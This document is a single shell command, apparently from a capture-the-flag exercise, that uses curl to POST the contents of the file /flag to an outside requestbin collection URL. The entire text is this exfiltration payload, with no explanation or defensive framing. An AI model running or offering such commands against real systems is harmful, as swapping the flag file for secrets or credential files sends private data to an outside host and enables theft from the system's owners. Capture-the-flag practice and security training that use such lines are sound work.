curl -X POST --data-binary "@/flag" https://requestbin.kanbanbox.com/1oh346c1
